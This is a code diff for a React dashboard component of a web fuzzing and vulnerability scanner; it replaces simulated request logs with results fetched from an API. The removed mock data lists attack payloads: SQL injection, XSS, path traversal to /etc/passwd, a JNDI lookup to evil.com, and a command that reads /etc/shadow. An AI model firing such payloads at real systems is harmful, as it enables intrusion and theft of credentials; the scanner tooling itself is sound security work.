@@ -1,93 +1,83 @@
 import React, { useState, useEffect, useRef } from 'react';
+import { useParams } from 'react-router-dom';
+import { scanService, FuzzResultItem, ScanStatistics } from '../services/api';
 import './FuzzingActivity.css';
 
-interface LogEntry {
-  id: string;
-  time: string;
-  req: string;
-  code: number;
-  payload: string;
-}
-
-const payloads = [
-  "' OR 1=1--",
-  "<script>alert(1)</script>",
-  "admin' #",
-  "../../../etc/passwd",
-  "'; WAITFOR DELAY '0:0:5'--",
-  "${jndi:ldap://evil.com/a}",
-  "{{7*7}}",
-  "; cat /etc/shadow",
-  "\\x00",
-  "' UNION SELECT NULL, NULL--"
-];
-
 export default function FuzzingActivity() {
-  const [requestCount, setRequestCount] = useState(24821);
-  const [logs, setLogs] = useState<LogEntry[]>([]);
+  const { scanId } = useParams();
+  const [fuzzResults, setFuzzResults] = useState<FuzzResultItem[]>([]);
+  const [stats, setStats] = useState<ScanStatistics | null>(null);
+  const [activeScanId, setActiveScanId] = useState<string>('');
+  const [loading, setLoading] = useState<boolean>(true);
   const streamRef = useRef<HTMLDivElement>(null);
 
   useEffect(() => {
-    let isActive = true;
-
-    const addLog = () => {
-      if (!isActive) return;
-
-      const payload = payloads[Math.floor(Math.random() * payloads.length)];
-      const rand = Math.random();
-      let code = 200;
-      if (rand < 0.1) code = 500;
-      else if (rand < 0.3) code = 403;
-      else if (rand < 0.4) code = 400;
-
-      setRequestCount(prev => prev + 1);
-      
-      const newLog = {
-        id: Math.random().toString(36).substr(2, 9),
-        time: new Date().toISOString().split('T')[1].substring(0, 12),
-        req: `REQ-${requestCount + 1}`,
-        code,
-        payload
-      };
-
-      setLogs(prev => {
-        const next = [...prev, newLog];
-        if (next.length > 50) return next.slice(next.length - 50);
-        return next;
-      });
-
-      if (streamRef.current) {
-        streamRef.current.scrollTop = streamRef.current.scrollHeight;
+    async function loadFuzzingData() {
+      try {
+        setLoading(true);
+        let currentId = scanId || localStorage.getItem('last_active_scan_id');
+        if (!currentId) {
+          const scanList = await scanService.getScans(1).catch(() => []);
+          if (scanList.length > 0) currentId = scanList[0].id;
+        }
+        
+        if (currentId) {
+          setActiveScanId(currentId);
+          const [fuzzList, scanStats] = await Promise.all([
+            scanService.getScanFuzzResults(currentId).catch(() => []),
+            scanService.getScanStatistics(currentId).catch(() => null)
+          ]);
+          setFuzzResults(fuzzList);
+          setStats(scanStats);
+        }
+      } catch (err) {
+        console.warn("Fuzzing data fetch error:", err);
+      } finally {
+        setLoading(false);
       }
-
-      setTimeout(addLog, Math.random() * 750 + 50);
-    };
-
-    // Initial populate
-    const initialLogs: LogEntry[] = Array.from({length: 15}).map((_, i) => ({
-      id: Math.random().toString(36).substr(2, 9),
-      time: new Date().toISOString().split('T')[1].substring(0, 12),
-      req: `REQ-${24821 - 15 + i}`,
-      code: 200,
-      payload: payloads[Math.floor(Math.random() * payloads.length)]
-    }));
-    
-    setLogs(initialLogs);
-
-    setTimeout(addLog, 500);
-
-    return () => { isActive = false; };
-  }, [requestCount]);
-
-  const getCodeClass = (code: number) => {
-    switch(code) {
-      case 200: return 'code-200';
-      case 400: return 'code-400';
-      case 403: return 'code-403';
-      case 500: return 'code-500';
-      default: return '';
     }
+    loadFuzzingData();
+
+    // Live poll if active
+    const interval = setInterval(async () => {
+      const currentId = scanId || localStorage.getItem('last_active_scan_id');
+      if (currentId) {
+        try {
+          const list = await scanService.getScanFuzzResults(currentId);
+          setFuzzResults(list);
+        } catch {}
+      }
+    }, 3000);
+
+    return () => clearInterval(interval);
+  }, [scanId]);
+
+  const totalRequests = stats ? stats.requests_performed : fuzzResults.length;
+  const anomaliesCount = fuzzResults.filter(f => f.anomaly_detected).length;
+  const activePayloadsCount = fuzzResults.length;
+
+  // Category distribution
+  const categoryCounts: Record<string, number> = {};
+  fuzzResults.forEach(f => {
+    categoryCounts[f.category] = (categoryCounts[f.category] || 0) + 1;
+  });
+
+  const totalFuzzCount = fuzzResults.length || 1;
+  const sqliPct = Math.round(((categoryCounts['SQLI'] || 0) / totalFuzzCount) * 100);
+  const xssPct = Math.round(((categoryCounts['XSS'] || 0) / totalFuzzCount) * 100);
+  const idorPct = Math.round(((categoryCounts['IDOR'] || 0) / totalFuzzCount) * 100);
+  const traversalPct = Math.round(((categoryCounts['OPEN_REDIRECT'] || 0) / totalFuzzCount) * 100);
+  const otherPct = Math.max(100 - (sqliPct + xssPct + idorPct + traversalPct), 0);
+
+  const getCodeClass = (code?: number) => {
+    if (!code) return '';
+    if (code >= 500) return 'code-500';
+    if (code >= 400) return 'code-400';
+    if (code >= 200 && code < 300) return 'code-200';
+    return '';
   };
+
+  const latestTest = fuzzResults.length > 0 ? fuzzResults[0] : null;
 
   return (
     <div className="fuzzing-container">
@@ -101,7 +91,7 @@ export default function FuzzingActivity() {
             <span className="material-symbols-outlined text-primary">send</span>
           </div>
           <div className="stat-value text-on-surface">
-            {requestCount.toLocaleString()} <span className="stat-sub text-primary">+1.2k/s</span>
+            {totalRequests.toLocaleString()} <span className="stat-sub text-primary">Live</span>
           </div>
         </div>
 
@@ -112,7 +102,7 @@ export default function FuzzingActivity() {
             <span className="material-symbols-outlined text-secondary">category</span>
           </div>
           <div className="stat-value text-on-surface">
-            8,432 <span className="stat-sub text-secondary">Active</span>
+            {activePayloadsCount} <span className="stat-sub text-secondary">Probes</span>
           </div>
         </div>
 
@@ -123,7 +113,7 @@ export default function FuzzingActivity() {
             <span className="material-symbols-outlined text-tertiary">warning</span>
           </div>
           <div className="stat-value" style={{color: 'var(--color-tertiary)'}}>
-            91 <span className="stat-sub" style={{opacity: 0.7}}>Review required</span>
+            {anomaliesCount} <span className="stat-sub" style={{opacity: 0.7}}>Validated in DB</span>
           </div>
         </div>
       </div>
@@ -139,22 +129,22 @@ export default function FuzzingActivity() {
               <span className="exec-title">Target Execution</span>
               <span className="priority-badge">
                 <span className="material-symbols-outlined" style={{fontSize: '14px'}}>local_fire_department</span>
-                Priority: High
+                Priority: Adaptive
               </span>
             </div>
 
             <div className="target-info">
               <div className="info-label">Endpoint</div>
               <div className="endpoint-display">
-                <span className="method-tag">POST</span>
-                <span className="endpoint-path">/api/v1/auth/login</span>
+                <span className="method-tag">SCAN</span>
+                <span className="endpoint-path">{latestTest?.endpoint_path || (stats?.target_url || '/api/v1')}</span>
               </div>
             </div>
 
             <div className="info-grid">
               <div className="info-box">
                 <div className="box-label">Target Parameter</div>
-                <div className="box-value">username</div>
+                <div className="box-value">{latestTest?.parameter_name || 'All Discovered'}</div>
               </div>
               <div className="info-box">
                 <div className="box-label">Mutation Strategy</div>
@@ -169,56 +159,56 @@ export default function FuzzingActivity() {
 
         {/* Payload Distribution */}
         <div className="panel-card">
-          <h3 className="dist-title">Payload Distribution</h3>
+          <h3 className="dist-title">Payload Distribution ({fuzzResults.length} probes)</h3>
           <div className="dist-list">
             
             <div className="dist-item">
               <div className="dist-row">
                 <span className="dist-name">SQL Injection</span>
-                <span className="dist-pct">35%</span>
+                <span className="dist-pct">{sqliPct}%</span>
               </div>
               <div className="dist-bar-bg">
-                <div className="dist-bar-fill bg-primary" style={{width: '35%'}}></div>
+                <div className="dist-bar-fill bg-primary" style={{width: `${Math.max(sqliPct, 5)}%`}}></div>
               </div>
             </div>
 
             <div className="dist-item">
               <div className="dist-row">
                 <span className="dist-name">Cross-Site Scripting</span>
-                <span className="dist-pct">25%</span>
+                <span className="dist-pct">{xssPct}%</span>
               </div>
               <div className="dist-bar-bg">
-                <div className="dist-bar-fill bg-tertiary" style={{width: '25%'}}></div>
+                <div className="dist-bar-fill bg-tertiary" style={{width: `${Math.max(xssPct, 5)}%`}}></div>
               </div>
             </div>
 
             <div className="dist-item">
               <div className="dist-row">
-                <span className="dist-name">OS Command Injection</span>
-                <span className="dist-pct">15%</span>
+                <span className="dist-name">IDOR / Boundary</span>
+                <span className="dist-pct">{idorPct}%</span>
               </div>
               <div className="dist-bar-bg">
-                <div className="dist-bar-fill bg-error" style={{width: '15%'}}></div>
+                <div className="dist-bar-fill bg-error" style={{width: `${Math.max(idorPct, 5)}%`}}></div>
               </div>
             </div>
 
             <div className="dist-item">
               <div className="dist-row">
-                <span className="dist-name">Path Traversal</span>
-                <span className="dist-pct">10%</span>
+                <span className="dist-name">Open Redirect / Traversal</span>
+                <span className="dist-pct">{traversalPct}%</span>
               </div>
               <div className="dist-bar-bg">
-                <div className="dist-bar-fill bg-secondary" style={{width: '10%'}}></div>
+                <div className="dist-bar-fill bg-secondary" style={{width: `${Math.max(traversalPct, 5)}%`}}></div>
               </div>
             </div>
 
             <div className="dist-item">
               <div className="dist-row">
-                <span className="dist-name">Other / Format String</span>
-                <span className="dist-pct">15%</span>
+                <span className="dist-name">Input Validation / Type</span>
+                <span className="dist-pct">{otherPct}%</span>
               </div>
               <div className="dist-bar-bg">
-                <div className="dist-bar-fill bg-outline-variant" style={{width: '15%'}}></div>
+                <div className="dist-bar-fill bg-outline-variant" style={{width: `${Math.max(otherPct, 5)}%`}}></div>
               </div>
             </div>
 
@@ -231,32 +221,43 @@ export default function FuzzingActivity() {
         <div className="stream-header">
           <div className="stream-title">
             <span className="material-symbols-outlined text-primary" style={{fontSize: '18px'}}>terminal</span>
-            Live Request Stream
+            Live Fuzzing Execution Stream {activeScanId ? `(#${activeScanId.slice(0, 8)})` : ''}
           </div>
           <div className="stream-status">
             <span className="status-dot-active"></span>
-            <span className="stream-status-text">Active</span>
+            <span className="stream-status-text">Database Backed</span>
           </div>
         </div>
         
         <div className="stream-body" ref={streamRef}>
-          {logs.map((log) => (
-            <div key={log.id} className={`stream-row ${log.code === 500 ? 'err-row' : ''}`}>
-              <span className="stream-time">[{log.time}]</span>
-              <span className="stream-req">{log.req}</span>
-              <span className={`stream-code ${getCodeClass(log.code)}`}>{log.code}</span>
-              <span className="stream-payload">
-                payload: <span className="payload-val">{log.payload}</span>
-              </span>
-              {log.code === 500 ? (
-                <span className="stream-anomaly">
-                  <span className="material-symbols-outlined" style={{fontSize: '14px'}}>bug_report</span> ANOMALY DETECTED
-                </span>
-              ) : (
-                <span style={{width: '128px'}}></span>
-              )}
+          {fuzzResults.length === 0 ? (
+            <div style={{padding: '32px', textAlign: 'center', color: 'var(--color-on-surface-variant)'}}>
+              No fuzzing execution records for this scan yet. Start or resume a scan to begin injecting adaptive test probes.
             </div>
-          ))}
+          ) : (
+            fuzzResults.map((item, idx) => {
+              const timeStr = item.executed_at ? new Date(item.executed_at).toISOString().split('T')[1].substring(0, 12) : '00:00:00.000';
+              return (
+                <div key={item.id || idx} className={`stream-row ${item.anomaly_detected ? 'err-row' : ''}`}>
+                  <span className="stream-time">[{timeStr}]</span>
+                  <span className="stream-req">{item.category}</span>
+                  <span className={`stream-code ${getCodeClass(item.status_code)}`}>{item.status_code || 200}</span>
+                  <span className="stream-payload">
+                    payload: <span className="payload-val">{item.payload}</span> {item.parameter_name ? `(param: ${item.parameter_name})` : ''}
+                  </span>
+                  {item.anomaly_detected ? (
+                    <span className="stream-anomaly">
+                      <span className="material-symbols-outlined" style={{fontSize: '14px'}}>bug_report</span> ANOMALY DETECTED
+                    </span>
+                  ) : (
+                    <span style={{width: '128px', fontSize: '11px', color: 'var(--color-on-surface-variant)', textAlign: 'right'}}>
+                      {item.response_time_ms ? `${item.response_time_ms.toFixed(0)}ms` : ''}
+                    </span>
+                  )}
+                </div>
+              );
+            })
+          )}
         </div>
       </div>
 
